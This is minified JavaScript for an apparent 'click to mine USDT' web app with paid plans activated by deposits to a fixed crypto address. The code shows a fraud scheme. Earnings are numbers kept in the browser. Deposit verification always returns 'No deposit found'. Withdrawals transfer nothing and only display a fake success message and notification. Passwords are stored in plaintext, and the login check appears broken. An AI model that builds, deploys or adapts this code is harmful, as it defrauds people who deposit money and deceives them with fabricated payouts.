let isLoginView=!0,currentUser=null,balance=0,miningRate=.001,activePlan="free",freePlanMined=0,freePlanLimit=.2,referralCode="",totalReferrals=0,referralEarnings=0,activeReferrals=0,referrals=[],notifications=[],plans=[{id:"free",name:"Free Plan",price:"FREE",speed:"0.001 USDT/click",limit:"0.2 USDT limit",active:!0,miningRate:.001,maxLimit:.2,icon:"fas fa-gem"},{id:"basic",name:"Basic Plan",price:"10 USDT",speed:"0.0016 USDT/click",limit:"14.66 USDT limit",active:!1,miningRate:.002,maxLimit:null,icon:"fas fa-medal"},{id:"standard",name:"Standard Plan",price:"50 USDT",speed:"0.0021 USDT/click",limit:"61.25 USDT limit",active:!1,miningRate:.0021,maxLimit:null,icon:"fas fa-award"},{id:"premium",name:"Premium Plan",price:"87 USDT",speed:"0.0026 USDT/click",limit:"102 USDT limit",active:!1,miningRate:.0026,maxLimit:null,icon:"fas fa-crown"},{id:"vip",name:"VIP Plan",price:"320 USDT",speed:"0.003 USDT/click",limit:"373 USDT limit",active:!1,miningRate:.003,maxLimit:null,icon:"fas fa-star"},{id:"elite",name:"Elite Plan",price:"640 USDT",speed:"0.0037 USDT/click",limit:"839 USDT limit",active:!1,miningRate:.0037,maxLimit:null,icon:"fas fa-rocket"}],authContainer=document.getElementById("auth-container"),appContainer=document.getElementById("app-container"),authTitle=document.getElementById("auth-title"),authForm=document.getElementById("auth-form"),authBtn=document.getElementById("auth-btn"),toggleText=document.getElementById("toggle-text"),toggleLink=document.getElementById("toggle-link"),authMessage=document.getElementById("auth-message"),usernameGroup=document.getElementById("username-group"),emailGroup=document.getElementById("email-group"),confirmPasswordGroup=document.getElementById("confirm-password-group"),miningCircle=document.getElementById("mining-circle"),currentBalanceEl=document.getElementById("current-balance"),modalBalance=document.getElementById("modal-balance"),withdrawBtn=document.getElementById("withdraw-btn"),withdrawModal=document.getElementById("withdraw-modal"),planInfoModal=document.getElementById("plan-info-modal"),depositModal=document.getElementById("deposit-modal"),limitModal=document.getElementById("limit-modal"),closeModals=document.querySelectorAll(".close-modal"),backBtn=document.getElementById("back-btn"),walletAddress=document.getElementById("wallet-address"),withdrawAmount=document.getElementById("withdraw-amount"),maxBtn=document.getElementById("max-btn"),submitWithdraw=document.getElementById("submit-withdraw"),copyBtn=document.getElementById("copy-btn"),depositAddress=document.getElementById("deposit-address"),verifyBtn=document.getElementById("verify-btn"),plansContainer=document.getElementById("plans-container"),planModalTitle=document.getElementById("plan-modal-title"),planModalMessage=document.getElementById("plan-modal-message"),withdrawOk=document.getElementById("withdraw-ok"),planOk=document.getElementById("plan-ok"),limitOk=document.getElementById("limit-ok"),qrImage=document.getElementById("qr-image"),copiedNotification=document.getElementById("copied-notification"),miningRateEl=document.getElementById("mining-rate"),navItems=document.querySelectorAll(".nav-item"),contentSections=document.querySelectorAll(".content-section"),referralLink=document.getElementById("referral-link"),copyReferralBtn=document.getElementById("copy-referral-btn"),totalReferralsEl=document.getElementById("total-referrals"),referralEarningsEl=document.getElementById("referral-earnings"),activeReferralsEl=document.getElementById("active-referrals"),emptyReferralsEl=document.getElementById("empty-referrals"),referralsContainer=document.getElementById("referrals-container"),emptyNotificationsEl=document.getElementById("empty-notifications"),notificationsContainer=document.getElementById("notifications-container");function init(){checkLoggedInUser(),setupAuthEventListeners(),createParticles(),generateQRCode()}function generateQRCode(){let e=depositAddress.value,t=`img/aleatoried.png`;qrImage.src=t,qrImage.alt=`QR Code for ${e}`}function checkLoggedInUser(){let e=localStorage.getItem("currentUser");e&&(currentUser=JSON.parse(e),loadUserData(),showApp())}function loadUserData(){let e=localStorage.getItem(`userData_${currentUser.username}`);if(e){let t=JSON.parse(e);balance=t.balance||0,miningRate=t.miningRate||.001,activePlan=t.activePlan||"free",freePlanMined=t.freePlanMined||0,referralCode=t.referralCode||generateReferralCode(),totalReferrals=t.totalReferrals||0,referralEarnings=t.referralEarnings||0,activeReferrals=t.activeReferrals||0,referrals=t.referrals||[],notifications=t.notifications||[]}else referralCode=generateReferralCode();updateMiningRate()}function updateMiningRate(){miningRateEl.textContent=miningRate.toFixed(3)}function generateReferralCode(){let e="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",t="";for(let n=0;n<8;n++)t+=e.charAt(Math.floor(Math.random()*e.length));return t}function saveUserData(){if(currentUser){let e={balance:balance,miningRate:miningRate,activePlan:activePlan,freePlanMined:freePlanMined,referralCode:referralCode,totalReferrals:totalReferrals,referralEarnings:referralEarnings,activeReferrals:activeReferrals,referrals:referrals,notifications:notifications};localStorage.setItem(`userData_${currentUser.username}`,JSON.stringify(e))}}function showApp(){authContainer.style.display="none",appContainer.style.display="block",updateBalance(),renderPlans(),updateReferralInfo(),updateNotifications(),setupAppEventListeners(),setupNavigation()}function showAuth(){authContainer.style.display="block",appContainer.style.display="none"}function setupAuthEventListeners(){toggleLink.addEventListener("click",toggleAuthView),authForm.addEventListener("submit",handleAuthSubmit)}function setupNavigation(){navItems.forEach(e=>{e.addEventListener("click",()=>{let t=e.getAttribute("data-section");navItems.forEach(e=>e.classList.remove("active")),e.classList.add("active"),contentSections.forEach(e=>e.classList.remove("active")),document.getElementById(t).classList.add("active")})})}function toggleAuthView(){isLoginView=!isLoginView,isLoginView?(authTitle.textContent="Login",authBtn.textContent="Login",toggleText.textContent="Don't have an account?",toggleLink.textContent="Register",emailGroup.style.display="none",confirmPasswordGroup.style.display="none"):(authTitle.textContent="Register",authBtn.textContent="Register",toggleText.textContent="Already have an account?",toggleLink.textContent="Login",emailGroup.style.display="block",confirmPasswordGroup.style.display="block"),authForm.reset(),showAuthMessage("","")}function handleAuthSubmit(e){e.preventDefault();let t=document.getElementById("username").value.trim(),n=document.getElementById("password").value,o=isLoginView?"":document.getElementById("email").value.trim(),r=isLoginView?"":document.getElementById("confirm-password").value;isLoginView?loginUser(t,n):n!==r?showAuthMessage("Passwords do not match","error"):o?registerUser(t,o,n):showAuthMessage("Email is required","error")}function showAuthMessage(e,t){authMessage.textContent=e,authMessage.className="auth-message",t?(authMessage.classList.add(t),authMessage.style.display="block"):authMessage.style.display="none"}function loginUser(e,t){let n=JSON.parse(localStorage.getItem("users")||"[]"),o=n.find(t=>t.username===e&&t.password===t);o?(currentUser=o,localStorage.setItem("currentUser",JSON.stringify(currentUser)),loadUserData(),showApp(),showAuthMessage("Login successful!","success")):showAuthMessage("Invalid username or password","error")}function registerUser(e,t,n){let o=JSON.parse(localStorage.getItem("users")||"[]");if(o.some(t=>t.username===e))return showAuthMessage("Username already exists","error");if(o.some(e=>e.email===t))return showAuthMessage("Email already registered","error");let r={username:e,email:t,password:n};o.push(r),localStorage.setItem("users",JSON.stringify(o)),currentUser=r,localStorage.setItem("currentUser",JSON.stringify(currentUser)),balance=0,miningRate=.001,activePlan="free",freePlanMined=0,referralCode=generateReferralCode(),totalReferrals=0,referralEarnings=0,activeReferrals=0,referrals=[],notifications=[],saveUserData(),showAuthMessage("Registration successful!","success"),setTimeout(()=>showApp(),1e3)}function setupAppEventListeners(){miningCircle.addEventListener("click",mineUSDT),withdrawBtn.addEventListener("click",()=>{withdrawModal.classList.add("active")}),maxBtn.addEventListener("click",()=>{withdrawAmount.value=balance.toFixed(3)}),submitWithdraw.addEventListener("click",handleWithdraw),copyBtn.addEventListener("click",copyDepositAddress),copyReferralBtn.addEventListener("click",copyReferralLink),verifyBtn.addEventListener("click",verifyDeposit),closeModals.forEach(e=>{e.addEventListener("click",()=>{document.querySelectorAll(".modal").forEach(e=>{e.classList.remove("active")})})}),backBtn.addEventListener("click",()=>{depositModal.classList.remove("active")}),withdrawOk.addEventListener("click",()=>withdrawModal.classList.remove("active")),planOk.addEventListener("click",()=>planInfoModal.classList.remove("active")),limitOk.addEventListener("click",()=>limitModal.classList.remove("active")),document.addEventListener("click",e=>{e.target.classList.contains("modal")&&e.target.classList.remove("active")}),document.addEventListener("click",e=>{if(e.target.classList.contains("plan-btn")){let t=e.target.getAttribute("data-id");activatePlan(t)}})}function updateBalance(){currentBalanceEl.textContent=balance.toFixed(3),modalBalance.textContent=balance.toFixed(3),saveUserData()}function updateReferralInfo(){referralLink.textContent=`${window.location.origin}/ref?id=${referralCode}`,totalReferralsEl.textContent=totalReferrals,referralEarningsEl.textContent=referralEarnings.toFixed(2),activeReferralsEl.textContent=activeReferrals,renderReferrals()}function updateNotifications(){0===notifications.length?(emptyNotificationsEl.style.display="block",notificationsContainer.style.display="none"):(emptyNotificationsEl.style.display="none",notificationsContainer.style.display="block",renderNotifications())}function renderNotifications(){notificationsContainer.innerHTML="";let e=[...notifications].sort((e,t)=>new Date(t.date)-new Date(e.date));e.forEach(e=>{let t=document.createElement("div");t.className="notification-item",t.innerHTML=`\n                    <div class="notification-header">\n                        <div class="notification-icon">\n                             <img class="g" src="img/bep20.png" alt=""><i class=""></i>\n                        </div>\n                        <div class="notification-title">Withdrawal Processed</div>\n                    </div>\n                    <div class="notification-details">\n                        <div class="notification-detail">\n                            <i class="fas fa-wallet"></i>\n                            <span>To: ${e.address.substring(0,10)}...${e.address.substring(e.address.length-8)}</span>\n                        </div>\n                        <div class="notification-detail">\n                            <i class="fas fa-money-bill-wave"></i>\n                            <span>Amount: <span class="notification-amount">${e.amount.toFixed(3)} USDT</span></span>\n                        </div>\n                    </div>\n                    <div class="notification-date">\n                        ${new Date(e.date).toLocaleDateString()} ${new Date(e.date).toLocaleTimeString()}\n                    </div>\n                `,notificationsContainer.appendChild(t)})}function renderReferrals(){if(0===referrals.length)emptyReferralsEl.style.display="block",referralsContainer.style.display="none";else{emptyReferralsEl.style.display="none",referralsContainer.style.display="block",referralsContainer.innerHTML="",referrals.forEach(e=>{let t=document.createElement("div");t.className="referral-item";let n=e.name.charAt(0).toUpperCase(),o=new Date(e.joinDate).toLocaleDateString();t.innerHTML=`\n                        <div class="referral-info">\n                            <div class="referral-avatar">${n}</div>\n                            <div>\n                                <div class="referral-name">${e.name}</div>\n                                <div class="referral-date">Joined: ${o}</div>\n                            </div>\n                        </div>\n                        <div class="referral-earnings">+${e.earnings.toFixed(2)} USDT</div>\n                    `,referralsContainer.appendChild(t)})}}function renderPlans(){plansContainer.innerHTML="",plans.forEach(e=>{let t=document.createElement("div");t.className="plan",t.innerHTML=`\n                    <div class="plan-info">\n                        <div class="plan-name">\n                            <i class="${e.icon}"></i>\n                            ${e.name}\n                        </div>\n                        <div class="plan-details">Speed: ${e.speed}</div>\n                        <div class="plan-details">${e.limit}</div>\n                        ${e.active?'<div class="plan-status">ACTIVE</div>':""}\n                    </div>\n                    <div>\n                        <div class="plan-price">${e.price}</div>\n                        <button class="plan-btn ${e.active?"in-use":""}" data-id="${e.id}">\n                            ${e.active?"In Use":"Activate"}\n                        </button>\n                    </div>\n                `,plansContainer.appendChild(t)})}function mineUSDT(){if("free"===activePlan&&freePlanMined>=freePlanLimit)limitModal.classList.add("active");else{balance+=miningRate,"free"===activePlan&&(freePlanMined+=miningRate),saveUserData(),updateBalance(),createClickEffect(),miningCircle.classList.add("mining-animation"),setTimeout(()=>{miningCircle.classList.remove("mining-animation")},500)}}function createClickEffect(){let e=document.createElement("div");e.className="click-effect";let t=Math.random()*Math.PI*2,n=80*Math.cos(t),o=80*Math.sin(t);e.style.left=`calc(50% + ${n}px)`,e.style.top=`calc(50% + ${o}px)`,miningCircle.appendChild(e),e.animate([{transform:"translate(-50%, -50%) scale(1)",opacity:1},{transform:"translate(-50%, -50%) scale(3)",opacity:0}],{duration:1e3,easing:"ease-out"}),setTimeout(()=>e.remove(),1e3)}function handleWithdraw(){let e=parseFloat(withdrawAmount.value),t=walletAddress.value.trim();if(!t)return alert("Please enter your BEP20 address");if(isNaN(e)||e<=0)return alert("Please enter a valid amount");if(e<5)return alert("Minimum withdrawal is 5 USDT");if(e>balance)return alert("Insufficient balance");let n=submitWithdraw.innerHTML;submitWithdraw.innerHTML='<i class="fas fa-spinner fa-spin"></i> Processing withdrawal...',submitWithdraw.disabled=!0,setTimeout(()=>{balance-=e,updateBalance(),withdrawModal.classList.remove("active"),walletAddress.value="",withdrawAmount.value="",addWithdrawalNotification(e,t),submitWithdraw.innerHTML=n,submitWithdraw.disabled=!1,showWithdrawalAlert(e,t)},2e3)}function addWithdrawalNotification(e,t){let n={id:Date.now(),type:"withdrawal",amount:e,address:t,date:(new Date).toISOString()};notifications.unshift(n),saveUserData(),updateNotifications()}function showWithdrawalAlert(e,t){let n=document.createElement("div");n.className="alert-overlay";let o=document.createElement("div");o.className="withdrawal-alert",o.innerHTML=`\n                <div class="alert-icon">\n                    <i class="fas fa-check-circle"></i>\n                </div>\n                <h3>Withdrawal Successful!</h3>\n                <p>Your withdrawal of <strong>${e.toFixed(3)} USDT</strong> to address <strong>${t.substring(0,10)}...${t.substring(t.length-8)}</strong> has been processed successfully.</p>\n                <button class="alert-close">OK</button>\n            `,document.body.appendChild(n),document.body.appendChild(o);let r=o.querySelector(".alert-close"),a=()=>{document.body.removeChild(n),document.body.removeChild(o)};r.addEventListener("click",a),n.addEventListener("click",a)}function activatePlan(e){let t=plans.find(t=>t.id===e);"free"===t.id?"free"===activePlan?showPlanMessage("Free Plan","This plan is already in use."):(activePlan="free",miningRate=t.miningRate,updatePlansStatus(),updateMiningRate()):(showPlanMessage(t.name,`Deposit ${t.price} to activate this plan.`),depositModal.classList.add("active"))}function showPlanMessage(e,t){planModalTitle.textContent=e,planModalMessage.textContent=t,planInfoModal.classList.add("active")}function updatePlansStatus(){plans.forEach(e=>e.active=e.id===activePlan),renderPlans(),saveUserData()}function copyDepositAddress(){depositAddress.select(),document.execCommand("copy"),copyBtn.innerHTML='<i class="fas fa-check"></i>',copiedNotification.classList.add("show"),setTimeout(()=>{copiedNotification.classList.remove("show")},2e3),setTimeout(()=>{copyBtn.innerHTML='<i class="far fa-copy"></i>'},2e3)}function copyReferralLink(){let e=`${window.location.origin}/ref?id=${referralCode}`,t=document.createElement("input");t.value=e,document.body.appendChild(t),t.select(),document.execCommand("copy"),document.body.removeChild(t),copyReferralBtn.innerHTML='<i class="fas fa-check"></i> Copied!',copiedNotification.classList.add("show"),setTimeout(()=>{copiedNotification.classList.remove("show")},2e3),setTimeout(()=>{copyReferralBtn.innerHTML='<i class="far fa-copy"></i> Copy Link'},2e3)}function verifyDeposit(){verifyBtn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Verifying...',verifyBtn.disabled=!0,setTimeout(()=>{verifyBtn.innerHTML='<i class="fas fa-times"></i> No deposit found',verifyBtn.style.background="var(--danger)",setTimeout(()=>{verifyBtn.innerHTML='<i class="fas fa-sync-alt"></i> Verify Deposit',verifyBtn.style.background="var(--warning)",verifyBtn.disabled=!1},3e3)},2e3)}function createParticles(){let e=document.getElementById("particles");for(let t=0;t<20;t++){let n=document.createElement("div");n.className="particle";let o=Math.random()*8+3;n.style.width=`${o}px`,n.style.height=`${o}px`,n.style.left=`${100*Math.random()}%`,n.style.bottom=`-${o}px`;let r=Math.random()*15+10;n.style.animationDuration=`${r}s`,n.style.animationDelay=`${5*Math.random()}s`,e.appendChild(n)}}init();